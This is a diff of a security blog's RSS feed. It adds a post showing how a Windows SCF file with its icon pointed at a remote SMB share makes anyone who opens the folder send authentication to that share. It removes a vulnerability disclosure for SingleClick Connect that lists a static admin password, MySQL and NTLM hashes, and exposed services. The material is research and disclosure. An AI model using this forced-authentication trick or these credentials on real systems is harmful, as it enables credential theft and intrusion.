@@ -7,8 +7,82 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>&amp;copy; 2016. All rights reserved.</copyright>
-    <lastBuildDate>Sun, 22 May 2016 21:55:12 -0400</lastBuildDate>
+    <lastBuildDate>Tue, 14 Jun 2016 07:35:28 -0500</lastBuildDate>
     <atom:link href="//room362.com/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>SMB/HTTP Auth Capture via SCF File</title>
+      <link>//room362.com/post/2016/smb-http-auth-capture-via-scf/</link>
+      <pubDate>Tue, 14 Jun 2016 07:35:28 -0500</pubDate>
+      
+      <guid>//room362.com/post/2016/smb-http-auth-capture-via-scf/</guid>
+      <description>
+
+&lt;p&gt;Recently saw a link to an SCF file. Didn&amp;rsquo;t know what those were
+so I went digging. Turns out they are a simple text based file that
+controls Windows Explorer. ;-)&lt;/p&gt;
+
+&lt;p&gt;Here are the examples I found via the references:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Open Explorer&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[Shell] 
+Command = 2 
+IconFile = explorer.exe, 1
+[Taskbar] 
+Command = Explorer
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Open &amp;ldquo;Channels&amp;rdquo; page in IE:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[Shell]
+Command=3
+IconFile=shdocvw.dll,-118
+[IE]
+Command=Channels
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This didn&amp;rsquo;t work for me at all, probably because Internet Explorer doesn&amp;rsquo;t have &amp;ldquo;Channels&amp;rdquo; anymore.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Minimize all windows:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[Shell]
+Command=2
+IconFile=explorer.exe,3
+[Taskbar]
+Command=ToggleDesktop
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;My first attempt to utilize this file format for fun was of course
+to just set the IconFile to an SMB share:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[Shell]
+Command=2
+IconFile=\\192.168.1.101\share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;and that worked as expected, every time the share was opened, whoever
+opened that folder it automatically attempted to authenticate to the
+share that I specified. Lots easier than writing an LNK file.&lt;/p&gt;
+
+&lt;p&gt;My gut is telling me there is more to this file format than meets the
+eye, especially when there are malware writers using it as well. I
+haven&amp;rsquo;t been able to get my hands on one to see what they are doing
+inside the file, but I assume it&amp;rsquo;s not just to minimize all windows.&lt;/p&gt;
+
+&lt;p&gt;There are some hints that you can invoke COM objects.. who knows&amp;hellip;&lt;/p&gt;
+
+&lt;h2 id=&#34;references:e67e0d37e8d3b4e0dfb3acae6e53ff79&#34;&gt;References:&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.blitzmax.com/Community/posts.php?topic=76323&#34;&gt;http://www.blitzmax.com/Community/posts.php?topic=76323&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20090122115553/http://shellrevealed.com/forums/thread/7604.aspx&#34;&gt;https://web.archive.org/web/20090122115553/http://shellrevealed.com/forums/thread/7604.aspx&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.programmershare.com/2403039/&#34;&gt;http://www.programmershare.com/2403039/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
     
     <item>
       <title>WPAD Persistence</title>
@@ -1208,143 +1282,6 @@ msf auxiliary(http_basic) &amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Game over!&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Full Disclosure - SingleClick Connect</title>
-      <link>//room362.com/post/2014/full-disclosure-singleclick-connect/</link>
-      <pubDate>Mon, 15 Sep 2014 11:26:38 -0500</pubDate>
-      
-      <guid>//room362.com/post/2014/full-disclosure-singleclick-connect/</guid>
-      <description>
-
-&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: I originally posted this to the Full Disclosure mailing list but for some reason it wasn&amp;rsquo;t accepted via the moderator so I&amp;rsquo;m posting it here. First, so that the information does get out there, and second to see if anyone knows why it may have been rejected.&lt;/p&gt;
-
-&lt;p&gt;I was helping out a family member with their computer when it came up that they &amp;ldquo;already had remote help software&amp;rdquo; (SingleClickConnect or SCC), when I asked what this was, the family member said it was installed by Dell Support when trying to fix their issue. This was in 2008. I removed it, and helped to fix the issue.&lt;/p&gt;
-
-&lt;p&gt;In 2010 another issue arose on the new computer (Dell again) of the same family member. Again, calling support first they had installed this software.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;: I can not say for certain that it was Dell&amp;rsquo;s support rep, or even that it was them that installed it, but if Dell is using this as a means of support they should probably cease for the following reasons:&lt;/p&gt;
-
-&lt;p&gt;Apache (port 40080) listening 0.0.0.0, MySQL (port 17771) listening 127.0.0.1, PHP, and UltraVNC (5900) are installed as a part of the software package.&lt;/p&gt;
-
-&lt;h2 id=&#34;issue-1:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #1&lt;/h2&gt;
-
-&lt;p&gt;Without decoding the ionCube &amp;ldquo;copyright protecting&amp;rdquo; software a large number of XSS, CSRF, and SQLi vulnerabilities were found, all unauthenticated to the web app that runs there.&lt;/p&gt;
-
-&lt;p&gt;No specifics are being posted on these vulnerabilities as I assume the site on the net (company&amp;rsquo;s site), where a registered user would log in are the same as the ones locally hosted (at least the app looks the same and has similar page structure)&lt;/p&gt;
-
-&lt;h2 id=&#34;issue-2:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #2&lt;/h2&gt;
-
-&lt;p&gt;MySQL&amp;rsquo;s root password is blank and there are two other default accounts as well allowing easy privilege escalation to SYSTEM (via the SCC local account - see ISSUE #5):&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;dsl *7E1CA3417E3A159A9188657F44C7034A8E9FDFF2
-tera *B2744A6BC5E8B1667BE5AED0111A2B941356E4A4
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;^ uncracked at this point. For all I know they could be randomized at install&lt;/p&gt;
-
-&lt;h2 id=&#34;issue-3:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #3&lt;/h2&gt;
-
-&lt;p&gt;Another service listens on 0.0.0.0 via port 17667 that I haven&amp;rsquo;t been able to identify, however when you connect to the socket, it starts listing users, services, printers and interfaces (and that is without sending any data to it).&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;$ ncat 172.16.102.149 17667
-8�TXPBASELINEXP_BASEP�RAdministratorGuestHelpAssistantSingleClick
-AdminSUPPORT_388945a0!aCACAMD PCNET Family PCI Ethernet Adapter -
-Packet Scheduler Miniport{47F69AAC-AE9A-40A9-88F5-A246A169CE92}�f�
-)�n�����f�f��fDownloadsC:\Documents and Settings\Administrator\My
-Documents\DownloadsMicrosoft XPS Document
-WriterXPSPortprinter#:2TPVM#:1TPVMACDWindows FirewallMicrosoftCreative
-Sound Blaster PCI
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;issue-4:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #4&lt;/h2&gt;
-
-&lt;p&gt;When UltraVNC is installed, it uses the same password as the one for your &amp;lsquo;registered&amp;rsquo; account (just password auth) and listens on 0.0.0.0. It is easily to decrypt from the UltraVNC.ini that is located in &lt;code&gt;%ApplicationData%&lt;/code&gt; for the user&lt;/p&gt;
-
-&lt;h2 id=&#34;issue-5:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #5&lt;/h2&gt;
-
-&lt;p&gt;A local account called &amp;ldquo;SingleClick Admin&amp;rdquo; is installed with a static
-password and added to the Administrators group. 3 services are also
-installed with the SingleClick Admin account as the user it runs
-under:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;Package d&#39;authentification  : NTLM
-Utilisateur principal       : SingleClick Admin
-     msv1_0 :     lm{ 7a9793d3082ba83b790ce07b3bdf85ea }, ntlm{ 2c292724d67fcf310d1c4dd153467be8 }
-     kerberos :     ~!3no1972!~
-     ssp :
-     wdigest :     ~!3no1972!~
-
-
- 8. Name         : _SC_Apache2.2
- 8. Service      : .\SingleClick Admin
- 8. Current      : ~!3no1972!~
-
- 9. Name         : _SC_dsl-fs-sync
- 9. Service      : .\SingleClick Admin
- 9. Current      : ~!3no1972!~
- 9. Old          : ~!3no1972!~
-
-10. Name         : _SC_hnmsvc
-10. Service      : .\SingleClick Admin
-10. Current      : ~!3no1972!~
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;concern-1:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;CONCERN #1&lt;/h2&gt;
-
-&lt;p&gt;As far as I can tell the software continuously scans you local network for other computers and file system for changes and reports these back to the central server so that when you login to their service you can see your files and connect to other systems in the LAN of the machine SingleClickConnect is installed on.&lt;/p&gt;
-
-&lt;h2 id=&#34;concern-2:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;CONCERN #2&lt;/h2&gt;
-
-&lt;p&gt;The user account password that you use to register and connect remotely is stored in the database. This actually looks decently done, or I just haven&amp;rsquo;t been able to identify the storage&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;Database: p2p
-Table:    config_info
-Value:    “user_hash”
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;concern-3:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;CONCERN #3&lt;/h2&gt;
-
-&lt;p&gt;Not sure what this registry key contains other than being named Cred4RA and assuming it&amp;rsquo;s credentials for the remote administration. Hopefully encrypted some how.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;[HKEY_LOCAL_MACHINE\SOFTWARE\SingleClick Systems\Advanced Networking
-Service\Settings\Remote Access]
-&amp;quot;ConfigState&amp;quot;=dword:00000001
-&amp;quot;Cred4RA&amp;quot;=hex:01,00,00 (snip snip)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;additional-information:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;Additional Information&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Software original site: &lt;a href=&#34;http://www.singleclickconnect.com/&#34;&gt;http://www.singleclickconnect.com/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Current site: &lt;a href=&#34;http://www.vivedriveconnect.com/&#34;&gt;http://www.vivedriveconnect.com/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Direct download of software (for home use): &lt;a href=&#34;http://downloads.vivedriveconnect.com/scc_setup.exe&#34;&gt;http://downloads.vivedriveconnect.com/scc_setup.exe&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&#34;vendor-contact:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;Vendor Contact&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Email sent in &lt;strong&gt;2010 July&lt;/strong&gt; about issues 1 - 5
-
-&lt;ul&gt;
-&lt;li&gt;No reply, and forgot about until 2013 when the software was
-mentioned by a friend (if I had ever heard of it)&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;2013 April&lt;/strong&gt; - Email sent again, forwarding original, bounced back as
-account unknown&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;2014 August&lt;/strong&gt; - Accidentally found notes while searching for
-something else, attempted to relocate the software via Archive.org
-with the feeling that the site had gone away and happened upon the new
-site,, downloaded software, confirmed issues, and forwarded the email
-to the new point of contact at the new domain. No response.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;2014 September&lt;/strong&gt;, Full disclosure.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Dell&amp;hellip; If your techs do actually use this software for support (I
-hope not) in any form or fashion, you are putting each one of them at
-a pretty high risk.&lt;/p&gt;
 </description>
     </item>
     
